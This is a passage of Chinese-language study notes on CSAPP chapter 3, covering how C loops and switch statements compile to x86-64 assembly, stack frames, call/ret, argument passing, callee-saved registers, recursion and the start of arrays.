<p>汇编中没有相应的指令存在，可以用<mark class="label success">条件测试</mark> 和 <mark class="label success">跳转</mark> 组合起来实现循环的效果。</p>
<h5 id="do-while-循环"><a href="#do-while-循环" class="headerlink" title="do-while 循环"></a>do-while 循环</h5><p>C语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    body-statement</span><br><span class="line">    <span class="keyword">while</span> (test-expr);</span><br></pre></td></tr></table></figure>

<p>汇编：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">loop:</span><br><span class="line">    body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure>

<p>这个循环的效果就是重复执行$body-statement$，对$test-expr$求值，如果求值的结果为非零，就继续循环。可以看到，$body-statement$ 至少会执行一次。</p>
<p><img data-src="https://i.loli.net/2020/10/12/apLOlDxZesBXtKg.png" alt="1B阶乘dowhile.png"></p>
<h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>有很多种方法将<code>while</code>循环翻译成机器代码，GCC在代码生成中使用其中的<strong>两种方法</strong>。这两种方法使用同样的循环结构，与<code>do-while</code>一样，不过它们实现初始测试的方法不同。</p>
<ul>
<li><mark class="label primary">跳转到中间</mark>（jump to middle）：它执行一个无条件跳转，跳到循环结尾处的测试，以此来执行初始的测试。可以用以下模板来表达这种方法，这个模板把通用的 while 循环格式翻译到 goto 代码:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">goto</span> test;</span><br><span class="line">loop:</span><br><span class="line">    body-statement</span><br><span class="line">test:</span><br><span class="line">    t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure>

<ul>
<li><mark class="label primary">guarded-do 模式</mark>：首先用条件分支，先进行判断条件分支，不成立就跳过循环，把代码变换为 do-while 循环。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">loop:</span><br><span class="line">    body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>



<h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>C语言的<code>for</code>循环：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(init-expr; test-expr; update-expr)</span><br><span class="line">  body-statement;</span><br></pre></td></tr></table></figure>

<p>实际上可以翻译成如下的while循环：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">init-expr:</span><br><span class="line"><span class="keyword">while</span>(test-expr)&#123;</span><br><span class="line">  body-statement</span><br><span class="line">  update-expr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GCC为<code>while</code>循环提供两种形式翻译：<strong>跳转到中间</strong>（<code>goto</code>语句）、<strong>guarded-do 模式</strong></p>
<h4 id="3-6-8-switch-语句"><a href="#3-6-8-switch-语句" class="headerlink" title="3.6.8 switch 语句"></a>3.6.8 switch 语句</h4><ul>
<li>使用 <strong>跳转表（jump table）</strong>这种数据结构提高效率，使得执行 <code>switch</code> 语句的时间与开关情况的数量无关。</li>
<li>跳转表是一个数组，表项 <code>i</code> 是一个代码段的地址，这个代码段实现当开关索引值等于 <code>i</code> 时程序应该采取的动作。</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/14/PgaqOCiuAE5tvkU.png" alt="19switch语句.png"></p>
<p><img data-src="https://i.loli.net/2020/10/14/fHsP8iOnmoM2lER.png" alt="1Dswitch2.png"></p>
<p>在本例中跳转表可以用 GCC 对 C 的扩展的方式表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &amp;&amp;表示指向代码位置的指针。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *jt[<span class="number">7</span>] = &#123;</span><br><span class="line">    &amp;&amp;loc_A, &amp;&amp;loc_def, &amp;&amp;loc_B,</span><br><span class="line">    &amp;&amp;loc_C, &amp;&amp;loc_D, &amp;&amp;loc_def,</span><br><span class="line">    &amp;&amp;loc_D</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>数组 <code>jt</code> 包含7个表项，每个都是一个<mark class="label danger">代码块的地址</mark></li>
<li>这些位置由代码中的标号定义，在 <code>jt</code> 的表项中由代码指针指明，由标号加上 <code>&amp;&amp;</code> 前缀组成。（回想运算符<code> &amp;</code>创建一个指向数据值的指针。在做这个扩展时，GCC的作者们创造了一个新的运算符 <code>&amp;&amp;</code>，这个运算符创建一个<mark class="label warning">指向代码位置</mark><mark class="label success">的指针</mark>）</li>
<li>执行 <code>switch</code> 语句的关键步骤是通过跳转表来访问代码位置</li>
<li>第5行，<code>jmp</code>指令的操作数有前缀<code>*</code>, <strong>表明这是一个间接跳转</strong>，操作数指定一个内存位置，索引由寄存器<code>rsi</code>给出，这个寄存器保存着<code>index</code>的值</li>
<li>跳转表对<strong>重复</strong>情况的处理就是简单地对表项4和6用同样的代码标号（loc_D），而对于<strong>缺失</strong>的情况的处理就是对表项1和5使用默认情况的标号（loc_def）</li>
</ul>
<p>其中<code>L4</code>的结构如下：</p>
<p><img data-src="https://i.loli.net/2020/10/14/i74tmVCuxkSMwNe.png" alt="1E跳转表.png"></p>
<div class="note info"><p>这些声明表明，在叫做 <code>rodata</code>（只读数据，Read-Only Data)的目标代码文件的段中，应该有一组<strong>7个“四”字</strong>（8个字节），每个字的值都是与指定的汇编代码标号（例如<code>.L3</code>）相关联的<strong>指令地址</strong>。<strong>标号<code>.L4</code>标记出这个分配地址的起始。与这个标号相对应的地址会作为间接跳转(第5行)的基地址。</strong></p>
</div>



<h3 id="3-7-过程"><a href="#3-7-过程" class="headerlink" title="3.7 过程"></a>3.7 过程</h3><p><strong>过程</strong>：用一组指定的参数和一个可选的返回值实现了某种功能。然后，可以在程序中不同的地方调用这个函数。</p>
<p>过程的形式多样：</p>
<ul>
<li>函数（function）</li>
<li>方法（method）</li>
<li>子例程（subroutine）</li>
<li>处理函数（handler）</li>
<li>….</li>
</ul>
<p>假设过程 P 调用过程 Q，Q 执行后返回到 P。这些动作包括下面一个或多个机制：</p>
<ul>
<li>传递控制：在进人过程 Q 的时候，程序计数器必须被设置为 Q 的代码的起始地址，然后在返回时，要把程序计数器设置为P中调用Q后面那条指令的地址。</li>
<li>传递数据：P 必须能够向 Q 提供一个或多个参数，Q 必须能够向 P 返回一个值。</li>
<li>分配和释放内存：在开始时，Q 可能需要为局部变量分配空间，而在返回前，又必须释放这些存储空间。</li>
</ul>
<h4 id="3-7-1-运行时栈"><a href="#3-7-1-运行时栈" class="headerlink" title="3.7.1 运行时栈"></a>3.7.1 运行时栈</h4><ul>
<li>当 x86-64 过程需要的存储空间超过寄存器能够存放的大小时，就会在栈上分配空间。这个部分成为过程的 <strong>栈帧（stack frame）</strong>。一般不超过 6 个的参数都可以通过寄存器传递。</li>
<li>X86-64的栈向<strong>低地址方向增长</strong>。</li>
<li>大多数过程的栈帧都是定长的，在过程的开始就分配好了。但也有变长的帧。将在3.10.5节中讨论。</li>
<li>当过程具有 6 个或更少的参数时，那么所有的参数都可以通过寄存器来传递，也就是说，当所有的局部变量都可以保存在寄存器中，且该函数不会调用任何其他函数，则不需要栈帧。</li>
<li>存放参数的寄存器的使用是有顺序的，即第一个参数、第二个参数·····第六个参数存放在那个寄存器是预定义好的，将在3.7.3中讨论。</li>
</ul>
<p>P调用过程Q时：</p>
<ul>
<li>当Q在执行时，P以及所有在向上追溯到P的调用链中的过程，都是暂时被<strong>挂起</strong>的。</li>
<li><strong>把返回地址压入栈中</strong>，表示从 Q 返回时，从 P 的哪个位置继续执行，它算作 P 的栈帧的一部分。因为他存放的是与 P 相关的状态。</li>
<li>Q 会扩展当前栈的边界，在这个空间里，可以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</li>
<li>最多可以通过寄存器传递 6 个整数值（指针和整数），如果 Q 需要更多的参数，则 P 可以在 Q 调用之前在自己的栈帧里存储好这些参数。</li>
<li>P 是调用者（caller），Q 是被调用者（callee）。</li>
<li><a href="https://zhuanlan.zhihu.com/p/27339191">x86-64 下函数调用及栈帧原理</a></li>
</ul>
<p>下图是通用的栈帧结构：</p>
<p><img data-src="https://i.loli.net/2020/12/14/RXLWwuvzb7r13qH.png" alt="1F栈帧.png"></p>
<h4 id="3-7-2-转移控制与函数返回"><a href="#3-7-2-转移控制与函数返回" class="headerlink" title="3.7.2 转移控制与函数返回"></a>3.7.2 转移控制与函数返回</h4><p>本节主要研究：</p>
<ul>
<li>转移控制指令<code>call</code>和<code>ret</code></li>
<li>函数返回</li>
</ul>
<mark class="label warning">转移控制</mark>

<p><code>call</code>指令用来调用函数，分为直接调用和间接调用，类似<code>jmp</code>指令也有直接和间接跳转。</p>
<ul>
<li>直接调用：<code>call Label</code>，目标<code>Label</code>是标号</li>
<li>间接调用：<code>call *Operand</code>，目标<code>*Operand</code>是<code>*</code>后跟一个操作数指示符</li>
</ul>
<div class="note danger"><p><code>call</code>的效果等价于 <code>push 返回地址</code> + <code>jmp 被调函数</code></p>
</div>



<div class="note success"><p><code>ret</code>的效果等价于 <code>pop 返回地址</code> + <code>jmp 调用者函数</code></p>
</div>

<p><code>call</code>指令调用过程：</p>
<ul>
<li><strong>修改</strong>程序计数器 PC</li>
<li><strong>压栈</strong>函数返回地址 A</li>
<li><strong>跳转</strong>到标号的函数（跳转到被调函数）</li>
</ul>
<p>在使用<code>call</code>指令跳转到被调函数时，需要使用到程序计数器 PC（<code>%rip</code>）（指令计数器、指令指针IP），为了使被调函数能成功返回到调用函数继续执行，需要将函数的返回地址A（跟在<code>call</code>指令后面的那条地址）压入栈中，将 PC 的值设置为被调函数的起始地址。</p>
<p><code>ret</code>指令会从栈中弹出返回地址 A，并把PC的值设置为 A。</p>
<blockquote>
<p>关于PC、IP、IR以及寄存器的调用：<a href="https://www.cnblogs.com/carl2380/p/4728606.html">程序计数器 PC， 指令寄存器IR、状态寄存器SR、通用寄存器GR</a></p>
</blockquote>
<mark class="label warning">函数的返回</mark>

<p>函数的调用和返回都涉及栈帧的变化，为了使函数返回到调用函数时能够继续执行返回地址的指令，要使栈指针<code>%rbp</code>和<code>%rsp</code>恢复到函数调用前的状态。</p>
<p><img data-src="https://i.loli.net/2020/12/14/qipebN8aKR54jTt.png" alt="栈帧"></p>
<div class="note success"><p>函数调用前栈帧调整：    </p>
<ol>
<li>保存当前栈帧状态值，以备后面恢复本栈帧时使用（<code>%rbp</code>入栈）</li>
<li>将当前栈帧切换到新栈帧（将RSP值装入RBP，更新栈帧底部，<code>movq %rsp, %rbp</code>）</li>
<li>给新栈帧分配空间（把RSP减去所需空间大小，抬高栈顶）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pushq %rbp        # 保存旧的帧指针，相当于创建新的栈帧</span><br><span class="line">movq  %rsp, %rbp  # 让 %rbp 指向新栈帧的起始位置</span><br><span class="line">subq  $N, %rsp    # 在新栈帧中预留一些空位，供子程序使用，用 (%rbp-K) 的形式引用空位</span><br></pre></td></tr></table></figure>
</div>



<div class="note default"><p>函数返回时栈帧调整：</p>
<ol>
<li>将栈顶指针抬高到该栈帧的基地址处（使<code>%rsp</code>指向<code>rbp</code>指针的位置）</li>
<li>将栈帧底部已经保存的<code>%rbp</code>值弹出并赋值给<code>%rbp</code>（使用<code>pop</code>指令，更新<code>%rbp</code>指向，使其恢复到函数调用前的位置，此时的<code>%rsp</code>会上上移一个位置恢复到函数调用前的栈顶位置）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq %rbp, %rsp   # 使 %rsp 和 %rbp 指向同一位置，即子栈帧的起始处</span><br><span class="line">popq %rbp         # 将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处</span><br></pre></td></tr></table></figure>
</div>

<p>注意：<code>%rsp</code>指向当前<mark class="label success">栈顶地址</mark>，即保存的值是栈顶的地址，而不是栈顶的值。<code>(%rax)</code>则成了内存引用，会取出这个指针指向的数据。</p>
<p>本小节参考的其他资料：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/104858020">[读书笔记]CSAPP：7[VB]机器级表示：函数</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/27339191">x86-64 下函数调用及栈帧原理</a></li>
<li><a href="https://www.cnblogs.com/czw52460183/p/10320393.html">CSAPP阅读笔记-栈帧-来自第三章3.7的笔记-P164-P176</a></li>
<li><a href="https://www.cnblogs.com/sddai/p/9762968.html">C函数调用过程原理及函数栈帧分析</a></li>
<li><a href="https://www.cnblogs.com/carl2380/p/4728606.html">程序计数器 PC， 指令寄存器IR、状态寄存器SR、通用寄存器GR</a></li>
<li><a href="https://www.cnblogs.com/zuoxiaolong/p/computer19.html">深入理解计算机系统（3.7）—汇编世界当中过程的经典（十分重要）（难度较高）</a></li>
<li><a href="https://www.cnblogs.com/33debug/p/6773059.html">函数的调用过程（栈帧）</a></li>
<li><a href="https://blog.csdn.net/anlian523/article/details/84501336">《深入理解计算机系统》 练习题3.27-3.28 被调用者保存寄存器 栈指针</a></li>
<li><a href="https://www.cnblogs.com/zuoxiaolong/p/computer15.html">深入理解计算机系统（3.3）—数据传送（或者说复制）指令详解</a></li>
</ul>
<h4 id="3-7-3-参数传递（参数构造区）"><a href="#3-7-3-参数传递（参数构造区）" class="headerlink" title="3.7.3 参数传递（参数构造区）"></a>3.7.3 参数传递（参数构造区）</h4><div class="note info"><ul>
<li>x86-64 中，可以通过寄存器最多传递6个整型参数。多余的部分就要通过栈来传递。每个函数的栈帧都包含保存的寄存器、局部变量和参数构造区三个部分</li>
<li>寄存器的使用是有特殊顺序的（如下图所示），寄存器使用的名字取决于要传递的数据类型的大小。</li>
<li>使用栈传递参数时，所有的数据大小都向<mark class="label primary">8</mark>的倍数对齐（仅在<strong>参数构造区</strong>中如此分配）。</li>
</ul>
</div>

<p><img data-src="https://i.loli.net/2020/10/15/HSqYd5RhKpCJwsG.png" alt="20参数寄存器.png"></p>
<p>假设函数 P 调用 Q ，Q 调用函数 R，P 调用 Q：</p>
<ol>
<li>如果过程P要向Q传递超过 n&gt;6 个参数，注意, 要在<mark class="label danger">P的栈帧上分配 n-6 的空间</mark>用来保存参数。</li>
<li>在 P 调用 Q 之前，按照上边的规则，将 1-6 号参数复制到相应的寄存器， 把剩下的 n – 6个参数，<mark class="label info">倒序</mark>依次压入栈中，也就是说第7个参数位于栈顶。</li>
<li>在通过栈传递数据时，所有的大小都对齐到8的倍数。上边的所有参数都到位之后, 就可以执行 call 转移控制。 此时的栈顶更新为 call 的下一条指令的地址（返回地址）。</li>
<li>控制权移交给Q的指令后，Q 可以通过寄存器访问 1-6 号参数， 7～n 号参数则可以通过栈来访问。</li>
</ol>
<p>Q 调用 R：</p>
<ol>
<li>如果Q调用其他过程 R，也超过 6 个参数，也需要在自己的栈帧中分配空间。 为超出的参数分配的空间， 叫做<mark class="label success">参数构造区</mark>。</li>
</ol>
<div class="note danger"><p>使用<code>%rsp</code>或<code>%rbp</code>来指示数据存放的位置：由于x86-64最小的寻址空间（一个地址块）是64位，即8个字节，在通过栈传递数据时，在<strong>参数构造区</strong>所有的大小都对齐到8的倍数，在<strong>局部变量区</strong>按实际数据大小分配，且需要<strong>对齐</strong>。通常一个数据块存放在栈中的某个连续块可以使用栈指针来指出它们的起始地址，然后这个地址块所占的空间大小是8的倍数个字节。</p>
</div>



<p><img data-src="https://i.loli.net/2020/10/16/EnIblaOtvz5ASgY.png" alt="21多参数的函数.png"></p>
<p><img data-src="https://i.loli.net/2020/10/16/HJgPhWyIp8CviS9.png" alt="22proc栈帧.png"></p>
<ol>
<li>如图3-29所示，把 proc 当被调用函数看，此时传了8个参数进来，调用它的函数已经把超出的2个参数（a4和a4p）压进了栈，a1-a3p 被按顺序分别放在了上面说的6个寄存器内。</li>
<li>如图3-30。尽管a4（char）只有一个字节，但是参数a4要占8个字节空间。可以看到，作为过程调用的一部分，<strong>返回地址</strong>被压人栈中并位于栈顶位置。因而这两个参数（<code>a4与a4p</code>）位于相对于栈顶指针距离为8和16的位置。<ul>
<li>a4 占8个字节空间，存在于<code>8(%rsp)～15(%rsp)</code></li>
<li>a4p 存在于<code>16(%rsp)～23(%rsp)</code></li>
<li>返回地址存在于存在于<code>(%rsp)～7(%rsp)</code></li>
</ul>
</li>
</ol>
<div class="note warning"><p><strong>调用者保存寄存器（Caller Save）和被调者保存寄存器（Callee Save）</strong>：</p>
<p>为什么要区分调用者保存寄存器和被调者保存寄存器？这是因为 CPU 的寄存器是有限的，但是在函数调用时，调用的函数可以使用寄存器，被调用的函数也可以使用寄存器从而覆盖父函数寄存器的值，那么为了保证函数返回时，并不会造成数据的错乱，所以要区分开寄存器的值是由调用者保存还是被调用者保存。</p>
<p><strong>调用者保存寄存器（Caller Save）</strong>：当函数调用时，调用函数会将属于“调用者保存寄存器”的寄存器的值压入自己的栈中保存起来，然后这些寄存器就可以在被调用的函数中使用，在被调函数中尽管这些寄存器的值被修改覆盖，在函数返回时，栈指针恢复到调用者的栈帧中，这些寄存器的值由于之前就已经被压栈，所有值并不会错乱。</p>
<p><strong>被调者保存寄存器（Callee Save）</strong>：当函数被调用时，当使用到“被调用者保存寄存器”时，这些寄存器的值就需要被调函数来进行保存，即压入自己的栈中（<mark class="label warning">使用push指令</mark> ），然后这些寄存器就可以被修改覆盖。然后在函数返回时这些寄存器的值从栈上能够恢复到最初的值（<mark class="label warning">使用pop指令</mark> ），所以值不会错乱。被调者保存寄存器有<mark class="label success">%rbx</mark> 、<mark class="label success">%rbp</mark> 和 <mark class="label success">%r12~%r15</mark> 。</p>
</div>



<div class="note primary"><p>指针的理解：数据在计算机中是一个一个字节存的，而每个字节都有一个序号，我们称这些字节序号为地址，或指针。即可以理解为<mark class="label warning">地址就是一个指针</mark>  。</p>
</div>

<p>栈指针<code>%rsp</code>：</p>
<ol>
<li>栈顶指针<code>%rsp</code>是随着函数运行不断变化的。</li>
<li>栈指针<code>%rsp</code>它其实不算是个寄存器，顾名思义，它是一个指针，指向<strong>当前栈顶地址</strong>。</li>
<li>比如<code>%rax</code>，它一个普通的寄存器，取<code>%rax</code>时，就会取它装有的8字节数据；可能它是个指针，取<code>(%rax)</code>时，则成了内存引用，会取出这个指针指向的数据；<br>而<code>%rsp</code>，它是栈指针，取<code>%rsp</code>时，返回的是当前栈指针的地址形如<code>0x7fffffffe820</code>；取<code>(%rsp)</code>时，则可能取出从 820～827 这 8 个字节里面存的数据；而一般来说，我们不需要取<code>%rsp</code>，因为要栈顶地址来根本没用。</li>
</ol>
<p><img data-src="https://i.loli.net/2020/10/16/fJGHXh95PxzwWvE.png" alt="调用者被调用者寄存器.png"></p>
<div class="note success"><p>使用<code>call</code>前会将局部变量入栈或寄存器（被调用者寄存器）中，然后将参数放入寄存器（调用者寄存器，0&lt;n&lt;7），然后执行<code>call</code>，<code>call</code>会将返回地址压入栈顶，此时该栈结束转移到新的栈中去。</p>
<p>在新的栈中，先将<code>%rbp</code><strong>压栈</strong>，若要使用到被调用者寄存器，则应先将寄存器的值压栈（这一步就是保存寄存器的值，使用<strong>被保存的寄存器区</strong>），然后是局部变量（看编译器是使用被调用者寄存器来保存局部变量还是使用栈，上述的三类必须使用栈，使用<strong>局部变量区</strong>），然后是<strong>参数构造区</strong>，先使用六个调用者寄存器，若参数大于6，则放到栈中。最后就是<code>ret</code>指令会自动弹出本栈中的返回地址（位于栈顶），然后自动修改<code>%rsp</code>的值。</p>
</div>



<h4 id="3-7-4-局部变量区"><a href="#3-7-4-局部变量区" class="headerlink" title="3.7.4 局部变量区"></a>3.7.4 局部变量区</h4><p><span id="sanlei">函数中以下三类局部变量必须存放在内存中的栈里面：</span></p>
<ol>
<li>寄存器不足够存放所有本地数据。</li>
<li>对一个局部变量使用地址运算符<code>&amp;</code>，此时是需要得到变量的地址的，那么显然变量就不能存在寄存器中，只能放栈上。</li>
<li>某些局部变量是数组或结构，因此必须能够通过数组或结构引用被访问到。</li>
</ol>
<p>对于<code>2</code>，如果变量被存储在寄存器中，则<mark class="label warning">没有内存地址</mark>，因此不能将地址操作符用于寄存器变量。</p>
<div class="note primary"><p>局部变量（Local Variable）是指作用域和生命周期都局限在所在函数或过程范围内的变量，它是相对于全局变量（Global variable）而言的。编译器在为局部变量分配空间时通常有两种做法：<strong>使用寄存器和使用栈</strong>。</p>
</div>

<div class="note danger"><p>关于使用<mark class="label danger">寄存器</mark>保存还是用<mark class="label warning">栈</mark>来保存<mark class="label success">局部变量</mark>：</p>
<ol>
<li>上述的<a href="#sanlei">三类</a>都是存放在栈上的，对于这三类中的 <code>1</code> 可以参考以下几点。</li>
<li>寄存器的访问速度快，但数量和空间有限，所以像<strong>字符串</strong>或<strong>数组</strong>不适合分配在寄存器中。编译器通常只会把频繁使用的临时变量分配在寄存器中，比如for循环中的循环变量。</li>
<li>当编译器的优化选项打开时，编译器会充分利用可用的寄存器来给临时变量使用，以提高程序的性能。对于调试版本，<strong>优化选项默认是关闭的，编译器会在栈上分配所有的变量</strong>。</li>
<li>在C&#x2F;C++程序中，可以在声明变量时加上register关键字，请求编译器在可能的情况下将该变量分配在寄存器中，但不能保证所描述的变量一定被分配在就存寄存器中。大多数时候，编译器还是根据全局设置和编译器自身的逻辑来决定是否把一个变量分配在寄存器中。</li>
<li>编译器会在编译阶段根据变量的特征和优化选项为每个局部变量选择以上的两种分配方法之一。大多数的局部变量都是分配在栈上的。栈上的变量会随着函数的调用和返回而自动分配和释放，所以栈有时也称为自动内存。</li>
</ol>
</div>

<p>[参考<a href="https://blog.csdn.net/shifters/article/details/6996819#commentBox">读书笔记_局部变量和栈帧.</a>]</p>
<p><img data-src="https://i.loli.net/2020/10/19/INA28M6E5Gehax7.png" alt="24swapadd.png"></p>
<p><img data-src="https://i.loli.net/2020/10/19/IiKEnpDV5OBQ4W1.png" alt="25swapadd.png"></p>
<p>在局部变量区，局部变量放到栈里面需要进行<mark class="label warning">数据对齐</mark>，如下图的四个局部变量<code>x1</code>、<code>x2</code>、<code>x3</code>、<code>x4</code>入栈（局部变量区）按顺序入栈。这里注意到，在同一块地址中数据对齐时，<code>x2</code>放在高地址，也就是说局部变量按顺序地从高地址到低地址进行数据对齐的方式进行入栈。然后是参数<code>x4</code>和<code>&amp;x4</code>入栈，由上一节已经知道，参数入栈按照GCC的规则是右边的参数先入栈，且参数构造区是不进行数据对齐的，每个参数都占8字节的倍数，如下图所示。（参数入栈可参考参数的<strong>调用约定</strong>）</p>
<p><img data-src="https://i.loli.net/2020/10/19/xqts3yoGI9FpzWU.png" alt="26参数栈帧.png"></p>
<h4 id="3-7-5-被保存的寄存器区"><a href="#3-7-5-被保存的寄存器区" class="headerlink" title="3.7.5 被保存的寄存器区"></a>3.7.5 被保存的寄存器区</h4><p>通用寄存器中的寄存器被分为两类：调用者寄存器、被调用者寄存器</p>
<div class="note danger"><p>其中，调用者寄存器用来传参，被调用者寄存器用来保存不满足<a href="#sanlei">这三类</a>和编译未优化时（大部分情况下）的局部变量。被调用者寄存器在使用前它的值需要进行压栈，保存上一个栈的状态，所以也可以把被保存的寄存器区分为局部变量区。</p>
</div>

<p>被调用者寄存器共六个：<code>%rbx</code>、<code>%rbp</code>、<code>%r12</code>、<code>%r13</code>、<code>%r14</code>、<code>%r15</code></p>
<p>当局部变量使用被调用者寄存器来保存时，应该先将寄存器的值进行压栈，以备后续栈帧恢复时能够正确恢复到之前的状态。</p>
<h4 id="3-7-6-递归"><a href="#3-7-6-递归" class="headerlink" title="3.7.6 递归"></a>3.7.6 递归</h4><p>递归是使用栈来实现的，这里我的理解是把<strong>局部变量使用的栈</strong>和<strong>被保存寄存器区部分</strong>统一起来看做所有的局部变量区域。</p>
<p>当局部变量使用寄存器时是使用被调用者寄存器，使用前须将寄存器值进行压栈保存，正是这一步骤使得函数在递归返回的时候能够继续使用调用函数的计算值。这样可以发现，每一个过程的栈区，都保留了需要还原给上一个栈的局部变量，自己的局部变量，交给下一个过程的参数这样一些内容。</p>
<div class="note warning"><p>函数的递归过程，假设递归函数为<code>rfact</code>：</p>
<ol>
<li>假设函数调用顺序为 <code>main</code> --&gt; <code>rfact</code> --&gt; <code>rfact_1</code>  --&gt; <code>rfact_2</code>  --&gt; <code>rfact_3</code>  --&gt; ····  --&gt;<code>rfact_n-1</code>  --&gt; <code>rfact_n</code> </li>
<li>每一个函数过程都会建立一个运行时栈，且函数没执行到 <code>ret</code> 指令时栈是不会被销毁的，这个时候会调用下一轮循环函数，本栈数据会进行保存，然后跳转到新的栈中去</li>
<li>当执行到最后一个函数<code>rfact_n</code> 时（判断条件成立），这个时候<code>rfact_n</code> 函数开始第一次执行 <code>ret</code> 指令，先弹出被保存的寄存器的值，带着返回值<code>%rax</code>进入到<code>rfact_n-1</code> 函数中去（<code>rfact_n</code> 函数栈释放），执行<code>rfact_n-1</code> 函数<code>call</code>后面的那条指令，然后直到<code>rfact_n-1</code> 函数的<code>ret</code> 指令，又带着<code>%rax</code>的值返回到<code>rfact_n-2</code>函数，直到最后返回到<code>rfact</code>函数</li>
<li>最后执行<code>rfact</code>的<code>ret</code> 指令返回到最初的调用函数<code>main</code> ，至此整个递归调用过程结束，所有的栈也得到释放</li>
</ol>
</div>



<p>举例，C语言如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">rfact</span><span class="params">(<span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> result = n * rfact(n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的汇编代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">rfact</span><span class="params">(<span class="keyword">long</span> n)</span></span></span><br><span class="line">n in %rdi</span><br><span class="line"></span><br><span class="line">rfact:</span><br><span class="line">    pushq   %rbx            将被调用者寄存器%rbx中的值保存起来, 这个值是什么呢</span><br><span class="line">    movq    %rdi, %rbx      保存n</span><br><span class="line">    movl    $<span class="number">1</span>, %eax        %rax中放入<span class="number">1</span></span><br><span class="line">    cmpq    %<span class="number">1</span>, %rdi        比较 n : <span class="number">1</span></span><br><span class="line">    jle     .L35            如果n&lt;=<span class="number">1</span> 跳转 L35 标号</span><br><span class="line">    leaq    <span class="number">-1</span>(%rdi), %rdi  n = n - <span class="number">1</span>, %rdi 此时减少<span class="number">1</span>, 同时也是<span class="number">1</span>号参数位置</span><br><span class="line">    call    rfact           调用 rfact(n<span class="number">-1</span>)</span><br><span class="line">    imulq   %rbx, %rax      用 %rbx中的 n 乘以 %rax中的 rfact(n<span class="number">-1</span>)的值</span><br><span class="line"></span><br><span class="line">  .L35:</span><br><span class="line">    popq    %rbx            还原%rbx</span><br><span class="line">    ret                     此时%eax中是<span class="number">1</span>, 直接就可以返回<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ol>
<li>如果我们在<code>main</code>函数中调用<code>rfact(3)</code>，在<code>rfact(3)</code>中<code>%rax</code>的值是不知道的，由于程序要使用<code>%rbx</code>，所以必须保存一下，假设这个值叫<code>U</code></li>
<li>之后<code>rfact(3)</code>相关内容进入系统， 此时先把<code>U</code>保存到了<code>rfact(3)</code>的栈区中， 然后在<code>%rbx</code>中存了 3， 之后使用 <code>%rdi = n-1​</code> 来调用<code>rfact(2)</code></li>
<li><code>rfact(2)</code>一开始的时候，<code>%rbx</code>中的值是 3，会把 3 保存到栈区， 然后把<code>%rbx</code>中存了 2，之后去调用<code>rfact(1)</code></li>
<li><code>rfact(1)</code>一开始的时候， <code>%rbx</code>中的值是 2， 会把 2 保存到栈区， 然后在<code>%rbx</code>中存了 1，之后去判断<code>n&lt;=1</code>， 结果发现成立，就把<code>%rbx</code>中的值还原成 2， 然后<code>ret 1</code> </li>
<li>此时控制权交给<code>rfact(2)</code>调用后的语句， 此时<code>%rbx</code>中的值是 2， 2 乘以<code>rfact(1)</code>返回的 1， 结果是 2，然后还原<code>%rbx</code> 为栈区中的 3，之后返回 2</li>
<li>控制权又交回给<code>rfact(3)</code>调用后的语句，此时<code>%rbx</code>中的值是 3，3 乘以<code>rfact(2)</code>的返回值 2， 结果是 6，然后返回给<code>main</code>函数，同时把栈区中的<code>U</code>还原到<code>%rbx</code>中。整个调用链就结束了</li>
</ol>
<h3 id="3-8-数组"><a href="#3-8-数组" class="headerlink" title="3.8 数组"></a>3.8 数组</h3><h4 id="3-8-1-一维数组"><a href="#3-8-1-一维数组" class="headerlink" title="3.8.1 一维数组"></a>3.8.1 一维数组</h4><p><strong>x86-64的内存引用指令用来简化数组引用</strong>。</p>
<p>一维数组的声明：$T\ A[N]$</p>
<ol>
<li>分配 <code>N</code> 个 <code>T类型大小</code>的连续空间</li>
<li>起始位置表示为 $x_a$ 。这个声明有两个效果。<ul>
<li>首先，它在内存中分配一个 $L * N$ 字节的连续区域，这里<code>L</code>是数据类型<code>T</code>的大小（单位为字节）。</li>
